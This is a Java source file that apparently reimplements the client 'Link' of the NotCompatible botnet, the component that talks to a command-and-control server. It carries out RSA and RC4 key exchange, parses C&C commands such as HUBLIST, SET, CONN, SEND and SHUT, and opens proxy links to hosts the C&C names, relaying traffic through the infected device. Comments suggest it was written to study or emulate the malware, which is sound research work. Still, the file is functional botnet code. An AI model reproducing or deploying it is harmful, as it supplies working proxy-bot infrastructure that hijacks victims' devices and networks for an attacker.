package diff.notcompatible.c.bot.net.tcp;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.util.logging.Logger;

import org.bouncycastle.util.encoders.Hex;

import diff.notcompatible.c.bot.ThreadServer;
import diff.notcompatible.c.bot.crypto.RC4;
import diff.notcompatible.c.bot.net.tcp.objects.ProxyList;
import diff.notcompatible.c.bot.objects.MyBuffer;
import diff.notcompatible.c.bot.objects.Packet;

/**
 * This is the "link" between the bot and the C&C server
 */
public class Link extends TCPSocket {
	
	private final static Logger LOGGER = Logger.getLogger("session");

    // This is unnecessary, if we have a status of LinkStatus.ONLINE (3) we know it is encrypted
    // private boolean isEncrypted;

    private ThreadServer owner;
    public long lastConnect;
    public ProxyList proxyList;
    private RC4 rc4Instream;
    private RC4 rc4Outstream;
    private MyBuffer receiveBuffer;
    Selector selector;
    InetSocketAddress socketAddress;
    public LinkStatus status;
    
    public boolean firstRead;

    public Link(ThreadServer newowner) {
    	firstRead = true;
        status = LinkStatus.OFFLINE;
        lastConnect = 0;
        owner = newowner;
        selector = owner.nio.selector;
        receiveBuffer = new MyBuffer();
        proxyList = new ProxyList();
    }
    
    public void init() {
        receiveBuffer.clear();
        writeBuffer.clear();
        rc4Instream = null;
        rc4Outstream = null;
        status = LinkStatus.OFFLINE;
        socketAddress = null;
        sendAndClose = false;
    }
    
    public void connect(InetSocketAddress sa) {
        try {
            status = LinkStatus.KEY_EXCHANGE_START;
            lastConnect = System.currentTimeMillis();
            channel = SocketChannel.open();
            channel.configureBlocking(false);
            socketAddress = sa;
            channel.connect(socketAddress);
            if (selector != null) {
                selfKey = channel.register(selector, 8);
                selfKey.attach(this);
                owner.nio.register(this);
            }
        } catch (IOException e) {
            try {
				onNoConnect(selfKey);
			} catch (IOException e1) {
				e1.printStackTrace();
			}
        }
    }
    

    public void close() {
        try {
        	firstRead = true;
            onClose(selfKey);
        } catch (Exception e) {
        	e.printStackTrace();
        }
    }

    public boolean isConnected() {
        return channel.socket().isConnected() && status == LinkStatus.ONLINE;
    }

    /*
     * (non-Javadoc)
     * @see diff.notcompatible.c.bot.net.TCPSocket#onClose(java.nio.channels.SelectionKey)
     */
    public void onClose(SelectionKey key) throws IOException {
        super.onClose(key);
        channel.close();
        status = LinkStatus.OFFLINE;
    }

    /*
     * (non-Javadoc)
     * @see diff.notcompatible.c.bot.net.TCPSocket#onConnect(java.nio.channels.SelectionKey)
     */
    public void onConnect(SelectionKey key) throws IOException {
        super.onConnect(key);
        LOGGER.info(" [*] Link established - sending public key for futher comms.");
    	
        byte[] ba = owner.RSALocal.rsaPublicKey.getModulus().toByteArray();
        if (ba[0] == 0) {
            byte[] tmp = new byte[(ba.length - 1)];
            System.arraycopy(ba, 1, tmp, 0, tmp.length);
            ba = tmp;
        }
        MyBuffer mb = new MyBuffer();
        mb.putDword(ba.length);
        mb.put(ba);
        send(mb.array());
        status = LinkStatus.KEY_EXCHANGE_DONE;
    }

    /*
     * (non-Javadoc)
     * @see diff.notcompatible.c.bot.net.TCPSocket#onNoConnect(java.nio.channels.SelectionKey)
     */
    public void onNoConnect(SelectionKey key) throws IOException {
        super.onNoConnect(key);
        owner.connectionManager.connectBad();
        status = LinkStatus.OFFLINE;
    }

    /*
     * (non-Javadoc)
     * @see diff.notcompatible.c.bot.net.TCPSocket#onRead(java.nio.channels.SelectionKey)
     */
    public void onRead(SelectionKey key) throws IOException {
        super.onRead(key);
        
        // Decrypt if the stream was set up already
        if (status == LinkStatus.ONLINE) {
        	LOGGER.info(" [!] Received data, decrypting!");
            receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
            readBuffer.clear();
        }
        
        if ((readBuffer.size <= 4 && receiveBuffer.size > 0) || status == LinkStatus.ONLINE) {
            parseCommand();
        } else {
        	// Get data length and shift over the size
            int dataLength = readBuffer.asDWord();
            readBuffer.shift(4);
            LOGGER.info(" [!] Received " + dataLength + " bytes of data, but no encryption has been set up!");
            if (dataLength > readBuffer.size) {
            	LOGGER.warning(" [!] Data claims we received " + dataLength + " bytes of data, larger than what the read buffer says we have - exiting!");
                close();
            } else {
            	LOGGER.info(" [+] Attempting to initialize encryption");
            	// Copy first section, which is the encrypted with this bots public RSA key that we just sent to the server.
            	// The decrypted part is then used as the rc4 key to decode the rest
                byte[] encryptedKey = new byte[dataLength];
                System.arraycopy(readBuffer.array(), 0, encryptedKey, 0, encryptedKey.length);
                readBuffer.shift(dataLength);
                
                // Decrypt the key used to initialize the rc4 streams
                byte[] rc4key = new byte[100];
                System.arraycopy(owner.RSALocal.decrypt(encryptedKey), 1, rc4key, 0, rc4key.length);
                
                // Configure rc4 objects and toggle encryption
                rc4Instream = new RC4(rc4key);
                rc4Outstream = new RC4(rc4key);
                
                // Toggle status, respond to server and mark connection as OK
                status = LinkStatus.ONLINE;
                sendHello();
                owner.connectionManager.connectOk();
                
                // Check for any extra commands
                receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
                readBuffer.clear();
                // Parse any command we got out of the above buffer
                if (receiveBuffer.size > 0 || status == LinkStatus.ONLINE) {
                    parseCommand();
                }
            }
        }
    }

    /**
     * Received a CONN packet, used for creating a ProxyLink
     * 
     * @param received
     */
    private void recvCONN(Packet received) {
    	LOGGER.info(" [*] Parsing CONN (proxy link) packet.");
    	
        Packet channelPacket = received.getByName("CH");
        if (channelPacket == null || channelPacket.buffer.size != 4) {
            sendError(1, 0);
        } else {
            int channel = channelPacket.asDWord();
            if (proxyList.getByChannel(channel) != null) {
                sendError(2, 0);
            } else {
                Packet portPacket = received.getByName("PORT");
                if (portPacket == null | portPacket.buffer.size != 2) {
                    sendError(1, 0);
                } else {
                    int port = portPacket.asPort();
                    Packet ipPacket = received.getByName("IP");
                    Packet domPacket = received.getByName("DOM");
                    if (ipPacket == null & domPacket == null) {
                        sendError(1, 0);
                    } else {
                        String server = ipPacket != null ? ipPacket.asIP() : domPacket.asString();
                        ProxyLink proxyLink = new ProxyLink(owner);
                        proxyLink.ch = channel;
                        proxyLink.connect(server, port);
                        proxyList.add(proxyLink);
                        LOGGER.info(" [+] New ProxyLink created to [ " + server + " / " + port + " ] on channel [ " + channel + " ]");
                    }
                }
            }
        }
    }

    /**
     * Receive and parse SEND (data) commands
     * @param send
     */
    private void recvSEND(Packet send) {
    	LOGGER.info(" [*] Parsing SEND packet.");
    	
        Packet channelPacket = send.getByName("CH");
        if (channelPacket == null | channelPacket.buffer.size != 4) {
            sendError(1, 0);
        } else {
            ProxyLink proxyLink = proxyList.getByChannel(channelPacket.asDWord());
            if (proxyLink == null) {
                sendError(3, 0);
            } else {
                Packet dataTransferPacket = send.getByName("DT");
                if (dataTransferPacket == null | dataTransferPacket.buffer.size == 0) {
                    sendError(1, 0);
                } else {
                    try {
                        proxyLink.send(dataTransferPacket.buffer.array());
                        LOGGER.info(" [+] Data sent to ProxyLink channel [ " + proxyLink.ch + " ] with DATA [ " + new String(dataTransferPacket.buffer.array()) + " ] ");
                    } catch (Exception exception) {
                    	exception.printStackTrace();
                        proxyLink.close();
                    }
                }
            }
        }
    }

	private void recvSET(Packet set) {
		LOGGER.info(" [*] Parsing SET (new setting) packet.");
    	Packet dataPacket = set.getByName("DATA");
        if (dataPacket != null) {
        	Packet signPacket = set.getByName("Sign");
            if (signPacket != null) {
            	Packet lidPacket = dataPacket.getByName("LID");
            	// Verify the set packet
                if (lidPacket != null &&
                		owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64() < lidPacket.asInt64() &&
                		owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
                	// Delete old one and save new config
                    owner.config.packet.delete("SET");
                    owner.config.packet.add(dataPacket);
                    owner.config.save(owner.sessionDirectory);
                    owner.connectionManager.load();
                    owner.sendSET();
                }
            }
        }
    }

    /**
     * Receive and parse the shut down ProxyLink command
     * @param killProxyLinkPacket
     */
    private void recvSHUT(Packet killProxyLinkPacket) {
    	LOGGER.info(" [*] Parsing SHUT (kill ProxyLinkPacket) packet.");
    	
    	// Ensure channel Packet is properly formed
        Packet channelPacket = killProxyLinkPacket.getByName("CH");
        if (channelPacket == null | channelPacket.buffer.size != 4) {
            sendError(1, 0);
        } else {
        	// Find ProxyLink
            ProxyLink proxyLink = proxyList.getByChannel(channelPacket.asDWord());
            if (proxyLink == null) {
            	// ProxyLink did not exist
                sendError(3, 0);
            } else {
            	// Ensure we have 
                if (killProxyLinkPacket.getByName("DT") == null | channelPacket.buffer.size == 0) {
                    sendError(1, 0);
                } else {
                    // Ensure we flush the write buffer if it is not yet done
                	if (proxyLink.writeBuffer.size > 0) {
                		proxyLink.sendAndClose = true;
                	}
                	// kill ProxyLink
                    proxyLink.close();
                }
            }
        }
    }

    private void sendHello() {
    	LOGGER.info(" [*] Sending hello packet.");
    	Packet helloPacket = new Packet();
        helloPacket.tag = "HELO";
        
        Packet versionPacket = helloPacket.add();
        versionPacket.tag = "VER";
        versionPacket.buffer.putDword(2);
        
        Packet uuidPacket = helloPacket.add();
        uuidPacket.tag = "UUID";
        uuidPacket.buffer.put(owner.config.packet.getByName("UUID").array());
        
        Packet portPacket = helloPacket.add();
        portPacket.tag = "PORT";
        portPacket.buffer.putWord(owner.config.packet.getByName("PORT").asPort());
        
        Packet groupPacket = helloPacket.add();
        groupPacket.tag = "GROUP";
        groupPacket.buffer.putWord(owner.config.packet.getByName("GROUP").asWord());
        
        // Hacky to get around this, looks like a bug in malware
        Packet ldGroupPacket = helloPacket.add();
        ldGroupPacket.tag = "LDGROUP";
        int ldGroupWord = 0;
        if(owner.config.packet.getByName("LDGROUP") != null) {
        	ldGroupWord = owner.config.packet.getByName("LDGROUP").asWord();
        }
        ldGroupPacket.buffer.putWord(ldGroupWord);
        
        Packet lidPacket = helloPacket.add();
        lidPacket.tag = "LID";
        // Normally it's in SET, removed here though .getByName("SET")
        lidPacket.buffer.putInt64(owner.config.packet.getByName("DATA").getByName("LID").asInt64());
        
        Packet connectionTypePacket = helloPacket.add();
        connectionTypePacket.tag = "CT";
        connectionTypePacket.buffer.putDword(owner.connectionType);
        
        // Unknown packet
        if (owner.config.packet.getByName("FB") != null) {
            owner.config.packet.delete("FB");
            owner.config.save(owner.sessionDirectory);
            helloPacket.add().tag = "FB";
        }
        
        // Add port opened tag
        if (owner.isOpenPort) {
            helloPacket.add().tag = "OP";
        }
        
        sendEncrypt(helloPacket.pack());
    }

    private void sendPong() {
    	LOGGER.info(" [*] Sending pong packet.");
        Packet pongPacket = new Packet();
        
        pongPacket.tag = "PONG";
        
        sendEncrypt(pongPacket.pack());
    }

    public void parseCommand() {
    	LOGGER.info(" [+] Attempting to parse packet");

    	LOGGER.info("Received data dump; ");
    	LOGGER.info(Hex.toHexString(receiveBuffer.array()));
        	
        Packet packet = null;
        while((packet = Packet.unpack(receiveBuffer)) != null) {
            if (packet.tag.equals("PING")) {
            	LOGGER.info(" [*] Parsed ping packet");
                sendPong();
            }else if (packet.tag.equals("HUBLIST")) {
            	LOGGER.info(" [*] Parsing a new hub list packet!");
                owner.hubList.loadFromPacket(packet);
                owner.saveHubList();
            }else if (packet.tag.equals("UDPHUBLIST")) {
            	LOGGER.info(" [*] Parsing a new UDP hub list packet!");
                owner.udpList.loadFromPacket(packet);
                owner.saveUDPHubList();
            }else if (packet.tag.equals("SETGROUP")) {
                owner.connectionManager.setGroup(packet.asWord());
                owner.config.packet.getByName("GROUP").buffer.clear();
                owner.config.packet.getByName("GROUP").buffer.put(packet.array());
                owner.config.save(owner.sessionDirectory);
                close();
            }else if (packet.tag.equals("SET")) {
                recvSET(packet);
            }else if (packet.tag.equals("SETV")) {
                Packet tmpp = packet.getByName("INDX");
                if (tmpp != null) {
                    owner.connectionManager.setIndex(tmpp.asDWord());
                    Packet tmpp1 = owner.config.packet.getByName("INDEXGROUP");
                    if (tmpp1 == null) {
                        tmpp1 = owner.config.packet.add();
                        tmpp1.tag = "INDEXGROUP";
                    }
                    tmpp1.buffer.clear();
                    tmpp1.buffer.put(tmpp.array());
                    owner.config.save(owner.sessionDirectory);
                    close();
                }
            }else if (packet.tag.equals("CONN")) {
                recvCONN(packet);
            }else if (packet.tag.equals("SHUT")) {
                recvSHUT(packet);
            }else if (packet.tag.equals("SEND")) {
                recvSEND(packet);
            }else { 
            	LOGGER.warning(" [!] Unknown packet hit using tag : [ " + packet.tag + " ]");
            }
        }
    }


    public void sendError(int num, int ch) {
    	LOGGER.warning(" [*] Sending error packet.");
    	Packet errorPacket = new Packet();
    	errorPacket.tag = "ERR";
    	
        Packet errorNumber = errorPacket.add();
        errorNumber.tag = "N";
        errorNumber.buffer.putDword(num);
        
        Packet channelPacket = errorPacket.add();
        channelPacket.tag = "CH";
        channelPacket.buffer.putDword(ch);
        
        sendEncrypt(errorPacket.pack());
    }

    public void sendGetHubList() {
    	LOGGER.info(" [*] Sending get hub list packet.");
    	Packet getHubListPacket = new Packet();
    	
        getHubListPacket.tag = "GETHUBLIST";
        
        sendEncrypt(getHubListPacket.pack());
    }

    public void sendOP() {
    	LOGGER.info(" [*] Sending OP (open port) packet.");
    	Packet opPacket = new Packet();
    	
    	opPacket.tag = "OP";
        
    	sendEncrypt(opPacket.pack());
    }

    /**
     * Use RC4 to cipher data and send to C&C
     * @param data
     */
    public void sendEncrypt(byte[] data) {
        if (isConnected()) {
        	LOGGER.info(" [+] Sending " + data.length + " bytes of data after encrypting...");
        	try {
                send(rc4Outstream.crypt(data));
            } catch (IOException e) {
                close();
            }
        }
    }
    
    public static enum LinkStatus {
    	OFFLINE, // No connection
    	KEY_EXCHANGE_START, // Connection started, need crypto
    	KEY_EXCHANGE_DONE, // Key sent to C&C
    	ONLINE // Key exchange done and valid
    }

}
